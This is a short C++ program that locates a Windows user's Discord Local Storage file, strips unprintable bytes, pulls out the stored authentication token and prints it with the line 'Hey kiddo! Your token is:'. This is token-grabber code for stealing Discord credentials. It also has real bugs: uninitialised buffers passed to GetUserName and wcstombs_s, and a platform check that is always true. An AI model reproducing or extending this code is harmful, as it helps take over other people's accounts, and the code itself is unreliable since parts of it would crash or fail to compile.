#include "stdafx.h"
#include <stdio.h>
#include <string>
#include <iostream>
#include <fstream>

#ifdef __unix__                    /* __unix__ is usually defined by compilers targeting Unix systems */

#define OS_Windows 0

#elif defined(_WIN32) || defined(WIN32)     /* _Win32 is usually defined by compilers targeting 32 or   64 bit Windows systems */

#define OS_Windows 1
#include <windows.h>

#endif


using namespace std;

bool isrealchar(int charNum)
{
	if (charNum > 32 && charNum < 127) return true;
	else return false;
}

bool creepyStrToRealChar(ifstream &fileToReadFrom, string *stringOut) //needed to strip these FUCKIGGNEFDNFS NUL!!!
{
	if (fileToReadFrom.is_open())
	{
		int c;
		while ((c = fileToReadFrom.get()) != EOF) { //while succesful read
			if (isrealchar(c))
				*stringOut += c; // then write the line in the output file 
		}
		fileToReadFrom.close();
		return 1;
	}
	else return 0;
}

std::string ExtractString(std::string source, std::string start, std::string end)
{
	std::size_t startIndex = source.find(start);
	if (startIndex == std::string::npos)
	{
		return "";
	}
	startIndex += start.length();
	std::string::size_type endIndex = source.find(end, startIndex);
	return source.substr(startIndex, endIndex - startIndex);
}

std::string getUsername()
{
	string usernameFound;
	#ifdef OS_Windows
	LPWSTR acUserName;
	char* ChrUserName;
	DWORD nUserName = sizeof(acUserName);
	if (GetUserName(acUserName, &nUserName))
		wcstombs_s(ChrUserName, acUserName, sizeof(ChrUserName));
	string Username(ChrUserName);
	usernameFound = Username;
	#elif 
	
	#endif
	return usernameFound;
}

int main(int argc, char *argv[])
{
	string textStr;
	string search = "token";
	string username = getUsername();
	string discordPath = "C:\\Users\\"+username+"\\AppData\\Roaming\\discord\\Local Storage\\https_discordapp.com_0.localstorage";
	ifstream myfile(discordPath);
	if (!creepyStrToRealChar(myfile, &textStr))
	{
		cout << "Cannot load file!" << endl;
		getchar();
		return -1;
	}
	//cout << textStr << endl;
	string token = ExtractString(textStr,"token\"","\"");
	cout << "Hey kiddo! Your token is: " << token << endl;
	getchar();
	return 0;
}